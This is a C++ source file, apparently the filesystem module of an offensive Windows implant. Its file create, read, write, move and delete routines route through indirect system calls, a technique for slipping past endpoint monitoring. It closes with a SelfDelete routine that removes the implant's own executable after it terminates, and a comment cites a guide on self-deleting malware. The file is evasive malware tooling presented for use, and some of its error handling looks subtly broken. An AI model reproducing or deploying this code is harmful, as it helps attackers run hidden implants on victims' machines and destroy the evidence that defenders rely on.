#include "core/system.hpp"

DWORD g_dwBytesTransferred = 0;

namespace System::Fs
{
    VOID CALLBACK FileIOCompletionRoutine(
        DWORD dwErrorCode,
        DWORD dwNumberOfBytesTransfered,
        LPOVERLAPPED lpOverlapped
    ) {
        // std::string sNumberOfBytesTransferred = std::to_string(dwNumberOfBytesTransfered);
        g_dwBytesTransferred = dwNumberOfBytesTransfered;
    }

    std::wstring AbsolutePathGet(
        Procs::PPROCS pProcs,
        const std::wstring& wPath,
        BOOL bExtendLength
    ) {
        // DWORD dwRet = 0;
        WCHAR wBuffer[MAX_PATH] = TEXT("");
        WCHAR wBuf[MAX_PATH] = TEXT("");
        WCHAR** lppPart = {NULL};

        NTSTATUS status = CallSysInvoke(
            &pProcs->sysRtlGetFullPathName_U,
            pProcs->lpRtlGetFullPathName_U,
            wPath.c_str(),
            MAX_PATH,
            wBuffer,
            lppPart
        );

        if (bExtendLength)
        {
            return L"\\??\\\\" + std::wstring(wBuffer);
        }
        else
        {
            return std::wstring(wBuffer);
        }
    }

    HANDLE DirectoryCreate(
        Procs::PPROCS pProcs,
        const std::wstring& wDirPath
    ) {
        std::wstring wDirAbsPath = System::Fs::AbsolutePathGet(pProcs, wDirPath, TRUE);

        NTSTATUS status;
        HANDLE hDir;

        IO_STATUS_BLOCK ioStatusBlock;
        OBJECT_ATTRIBUTES objAttr;
        UNICODE_STRING uniDirPath;

        status = CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniDirPath,
            wDirAbsPath.c_str()
        );
        InitializeObjectAttributes(&objAttr, &uniDirPath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        status = pProcs->lpNtCreateFile(
            &hDir,
            FILE_GENERIC_WRITE | SYNCHRONIZE,
            &objAttr,
            &ioStatusBlock,
            NULL,
            FILE_ATTRIBUTE_DIRECTORY,
            0,
            FILE_CREATE,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );
        if (status != STATUS_SUCCESS)
        {            
            return NULL;
        }

        return hDir;
    }

    std::vector<std::wstring> DirectoryGetFiles(
        Procs::PPROCS pProcs,
        const std::wstring& wDirPath,
        BOOL bRecurse
    ) {
        std::vector<std::wstring> files = {};

        WIN32_FIND_DATA ffd;
        LARGE_INTEGER fileSize;
        WCHAR wTargetDir[MAX_PATH];
        HANDLE hFind = INVALID_HANDLE_VALUE;
        DWORD dwError = 0;

        pProcs->lpRtlStringCchCopyW(wTargetDir, MAX_PATH, wDirPath.c_str());
        pProcs->lpRtlStringCchCatW(wTargetDir, MAX_PATH, TEXT("\\*"));

        hFind = pProcs->lpFindFirstFileW(wTargetDir, &ffd);
        if (hFind == INVALID_HANDLE_VALUE)
        {
            return files;
        }

        do
        {
            std::wstring wPathName = std::wstring(ffd.cFileName);
            if (wPathName == L"." || wPathName == L"..")
            {
                continue;
            }

            std::wstring wFullPathName = wDirPath + L"\\" + wPathName;
            if (wFullPathName == L"")
            {
                continue;
            }

            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                // std::wstring wFullDirName = System::Fs::AbsolutePathGet(wPathName);

                if (bRecurse && wFullPathName != wDirPath)
                {
                    std::vector<std::wstring> childFiles = System::Fs::DirectoryGetFiles(
                        pProcs,
                        wFullPathName,
                        bRecurse
                    );
                    files.insert(files.end(), childFiles.begin(), childFiles.end());
                }
                else
                {
                    files.push_back(wFullPathName);
                }
            }
            else
            {
                files.push_back(wFullPathName);
            }
        } while (pProcs->lpFindNextFileW(hFind, &ffd) != 0);

        return files;
    }

    BOOL DirectoryChangeCurrent(
        Procs::PPROCS pProcs,
        const std::wstring& wDestPath
    ) {
        UNICODE_STRING uniDestPath;
        NTSTATUS status;

        std::wstring wDestAbsPath = System::Fs::AbsolutePathGet(pProcs, wDestPath, FALSE);
        CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniDestPath,
            wDestAbsPath.c_str()
        );

        status = CallSysInvoke(
            &pProcs->sysRtlSetCurrentDirectory_U,
            pProcs->lpRtlSetCurrentDirectory_U,
            &uniDestPath
        );
        if (status != STATUS_SUCCESS)
        {
            return FALSE;
        }

        return TRUE;
    }

    HANDLE FileCreate(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath,
        DWORD               dwCreateDisposition,
        DWORD               dwCreateOptions
    ) {
        NTSTATUS status;
        HANDLE hFile;

        // Open file
        IO_STATUS_BLOCK ioStatusBlock;
        OBJECT_ATTRIBUTES objAttr;
        UNICODE_STRING uniFilePath;

        std::wstring wFileAbsPath = System::Fs::AbsolutePathGet(pProcs, wFilePath, TRUE);
        CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniFilePath,
            wFileAbsPath.c_str()
        );
        InitializeObjectAttributes(&objAttr, &uniFilePath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        status = pProcs->lpNtCreateFile(
            &hFile,
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            &objAttr,
            &ioStatusBlock,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            dwCreateDisposition, // e.g. CREATE_ALWAYS, OPEN_IF, 
            dwCreateOptions, // e.g. FILE_NON_DIRECTORY_FILE | FILE_ATTRIBUTE_NORMAL,
            NULL,
            0
        );
        if (status != STATUS_SUCCESS)
        {
            return NULL;
        }

        return hFile;
    }
    
    std::vector<BYTE> FileRead(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath
    ) {
        NTSTATUS status;
        HANDLE hFile;

        // Open file
        IO_STATUS_BLOCK ioStatusBlock;
        OBJECT_ATTRIBUTES objAttr;
        UNICODE_STRING uniFilePath;
        
        std::wstring wFileAbsPath = System::Fs::AbsolutePathGet(pProcs, wFilePath, TRUE);
        CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniFilePath,
            wFileAbsPath.c_str()
        );
        InitializeObjectAttributes(&objAttr, &uniFilePath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        status = CallSysInvoke(
            &pProcs->sysNtCreateFile,
            pProcs->lpNtCreateFile,
            &hFile,
            FILE_GENERIC_READ,
            &objAttr,
            &ioStatusBlock,
            nullptr,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            OPEN_EXISTING,
            FILE_SYNCHRONOUS_IO_NONALERT,
            nullptr,
            0
        );
        if (status != STATUS_SUCCESS)
        {            
            return std::vector<BYTE>();
        }

        // Get file size
        FILE_STANDARD_INFORMATION fileInfo;
        status = CallSysInvoke(
            &pProcs->sysNtQueryInformationFile,
            pProcs->lpNtQueryInformationFile,
            hFile,
            &ioStatusBlock,
            &fileInfo,
            sizeof(fileInfo),
            FileStandardInformation
        );
        if (status != STATUS_SUCCESS)
        {
            pProcs->lpNtClose(hFile);
            return std::vector<BYTE>();
        }

        // Allocate a buffer
        ULONG bufferSize = (ULONG)fileInfo.EndOfFile.QuadPart;
        std::vector<BYTE> buffer(bufferSize);

        // Read file contents
        LARGE_INTEGER byteOffset;
        byteOffset.QuadPart = 0;

        status = CallSysInvoke(
            &pProcs->sysNtReadFile,
            pProcs->lpNtReadFile,
            hFile,
            nullptr,
            nullptr,
            nullptr,
            &ioStatusBlock,
            buffer.data(),
            bufferSize,
            &byteOffset,
            nullptr
        );
        if (status == STATUS_PENDING)
        {
            System::Handle::HandleWait(pProcs, hFile, FALSE, nullptr);
            if (status != STATUS_SUCCESS)
            {
                System::Handle::HandleClose(pProcs, hFile);
                return std::vector<BYTE>();
            }
        }
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hFile);
            return std::vector<BYTE>();
        }

        if (ioStatusBlock.Information <= 0)
        {
            System::Handle::HandleClose(pProcs, hFile);
            return std::vector<BYTE>();
        }

        System::Handle::HandleClose(pProcs, hFile);

        return buffer;
    }

    BOOL FileWrite(
        Procs::PPROCS               pProcs,
        const std::wstring&         wFilePath,
        const std::vector<BYTE>&    bytes
    ) {
        NTSTATUS status;
        HANDLE hFile;

        // Open file
        IO_STATUS_BLOCK ioStatusBlock;
        OBJECT_ATTRIBUTES objAttr;
        UNICODE_STRING uniFilePath;

        std::wstring wFileAbsPath = System::Fs::AbsolutePathGet(pProcs, wFilePath, TRUE);
        status = CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniFilePath,
            wFileAbsPath.c_str()
        );
        InitializeObjectAttributes(&objAttr, &uniFilePath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        status = CallSysInvoke(
            &pProcs->sysNtCreateFile,
            pProcs->lpNtCreateFile,
            &hFile,
            FILE_GENERIC_WRITE,
            &objAttr,
            &ioStatusBlock,
            nullptr,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN_IF,
            FILE_NON_DIRECTORY_FILE,
            nullptr,
            0
        );
        if (status != STATUS_SUCCESS)
        {            
            return FALSE;
        }

        // Write data to the file.
        LARGE_INTEGER byteOffset;
        byteOffset.QuadPart = 0;

        status = CallSysInvoke(
            &pProcs->sysNtWriteFile,
            pProcs->lpNtWriteFile,
            hFile,
            nullptr,
            nullptr,
            nullptr,
            &ioStatusBlock,
            (PVOID)bytes.data(),
            bytes.size(),
            &byteOffset,
            nullptr
        );
        if (status == STATUS_PENDING)
        {
            if (!System::Handle::HandleWait(pProcs, hFile, FALSE, nullptr))
            {
                System::Handle::HandleClose(pProcs, hFile);
                return FALSE;
            }
            status = STATUS_SUCCESS;
        }
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hFile);
            return FALSE;
        }

        if (ioStatusBlock.Information <= 0)
        {
            System::Handle::HandleClose(pProcs, hFile);
            return FALSE;
        }

        System::Handle::HandleClose(pProcs, hFile);

        return TRUE;
    }

    BOOL FileMove(
        Procs::PPROCS       pProcs,
        const std::wstring& wSrc,
        const std::wstring& wDest
    ) {
        NTSTATUS status;

        std::wstring wSrcAbs = System::Fs::AbsolutePathGet(pProcs, wSrc, TRUE);
        std::wstring wDestAbs = System::Fs::AbsolutePathGet(pProcs, wDest, TRUE);

        UNICODE_STRING uniSrc;
        UNICODE_STRING uniDest;

        status = CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniSrc,
            wSrcAbs.c_str()
        );
        status = CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniDest,
            wDestAbs.c_str()
        );

        // Open source handle
        HANDLE hSrc;
        IO_STATUS_BLOCK ioStatusBlock;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &uniSrc, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        status = CallSysInvoke(
            &pProcs->sysNtCreateFile,
            pProcs->lpNtCreateFile,
            &hSrc,
            DELETE,
            &oa,
            &ioStatusBlock,
            nullptr,
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OPEN,
            0,
            nullptr,
            0
        );
        if (status != STATUS_SUCCESS)
        {
            return FALSE;
        }

        // Change file information
        // ULONG uSizeNeeded = sizeof(FILE_RENAME_INFORMATION) + uniDest.Length;

        FILE_RENAME_INFORMATION renameInfo;
        renameInfo.ReplaceIfExists = TRUE;
        renameInfo.RootDirectory = nullptr;
        renameInfo.FileNameLength = uniDest.Length;

        pProcs->lpRtlCopyMemory(renameInfo.FileName, uniDest.Buffer, uniDest.Length);

        status = CallSysInvoke(
            &pProcs->sysNtSetInformationFile,
            pProcs->lpNtSetInformationFile,
            hSrc,
            &ioStatusBlock,
            &renameInfo,
            sizeof(renameInfo) + uniDest.Length,
            FileRenameInformation
        );
        if (status != STATUS_SUCCESS)
        {
            System::Handle::HandleClose(pProcs, hSrc);
            return FALSE;
        }

        System::Handle::HandleClose(pProcs, hSrc);

        return TRUE;
    }

    BOOL FileDelete(
        Procs::PPROCS       pProcs,
        const std::wstring& wFilePath
    ) {
         NTSTATUS status;

        std::wstring wFileAbsPath = System::Fs::AbsolutePathGet(pProcs, wFilePath, TRUE);

        UNICODE_STRING uniFilePath;

        status = CallSysInvoke(
            &pProcs->sysRtlInitUnicodeString,
            pProcs->lpRtlInitUnicodeString,
            &uniFilePath,
            wFileAbsPath.c_str()
        );

        // Open source handle
        IO_STATUS_BLOCK ioStatusBlock;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, &uniFilePath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

        status = CallSysInvoke(
            &pProcs->sysNtDeleteFile,
            pProcs->lpNtDeleteFile,
            &oa
        );
        if (status != STATUS_SUCCESS)
        {
            return FALSE;
        }

        return TRUE;
    }

    DWORD FileGetSize(
        Procs::PPROCS   pProcs,
        HANDLE          hFile
    ) {
        DWORD dwFileSize;

        NTSTATUS status;
        IO_STATUS_BLOCK ioStatusBlock;
        FILE_STANDARD_INFORMATION fileInfo;

        status = CallSysInvoke(
            &pProcs->sysNtQueryInformationFile,
            pProcs->lpNtQueryInformationFile,
            hFile,
            &ioStatusBlock,
            &fileInfo,
            sizeof(fileInfo),
            FileStandardInformation
        );
        if (status != STATUS_SUCCESS)
        {
            return INVALID_FILE_SIZE;
        }

        dwFileSize = fileInfo.EndOfFile.QuadPart;
        return dwFileSize;
    }

    // Self-Deletion is used after terminating the implant process.
    // https://www.rotta.rocks/offensive-tool-development/anti-analysis-techniques/anti-debugging-techniques/self-deleting-malware#final-code
    BOOL SelfDelete(Procs::PPROCS pProcs)
    {
        LPCWSTR lpNewStream = L":null";
        SIZE_T dwStreamLength = wcslen(lpNewStream) * sizeof(wchar_t);
        SIZE_T dwRename = sizeof(FILE_RENAME_INFO) + dwStreamLength;

        PFILE_RENAME_INFO pRename = (PFILE_RENAME_INFO)pProcs->lpHeapAlloc(
            pProcs->lpGetProcessHeap(),
            HEAP_ZERO_MEMORY,
            dwRename
        );
        if (!pRename)
        {
            return FALSE;
        }

        WCHAR wPath[MAX_PATH * 2] = {0};
        FILE_DISPOSITION_INFO fdi = {0};

        RtlZeroMemory(wPath, sizeof(wPath));
        RtlZeroMemory(&fdi, sizeof(FILE_DISPOSITION_INFO));

        fdi.DeleteFile = TRUE;

        pRename->FileNameLength = dwStreamLength;
        pProcs->lpRtlCopyMemory(pRename->FileName, lpNewStream, dwStreamLength);

        // Get the path for the current executable itself.
        if (pProcs->lpGetModuleFileNameW(NULL, wPath, MAX_PATH * 2) == 0)
        {
            return FALSE;
        }

        // Rename
        HANDLE hFile;
        hFile = pProcs->lpCreateFileW(
            wPath,
            DELETE | SYNCHRONIZE,
            FILE_SHARE_READ,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr
        );
        if (hFile == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }

        // Rename the data stream
        if (!pProcs->lpSetFileInformationByHandle(hFile, FileRenameInfo, pRename, dwRename))
        {
            return FALSE;
        }

        pProcs->lpCloseHandle(hFile);

        // Delete
        hFile = pProcs->lpCreateFileW(
            wPath,
            DELETE | SYNCHRONIZE,
            FILE_SHARE_READ,
            nullptr,
            OPEN_EXISTING,
            0,
            nullptr
        );
        if (hFile == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }

        if (!pProcs->lpSetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(fdi)))
        {
            return FALSE;
        }

        pProcs->lpCloseHandle(hFile);
        pProcs->lpHeapFree(pProcs->lpGetProcessHeap(), 0, pRename);

        return TRUE;
    }
}
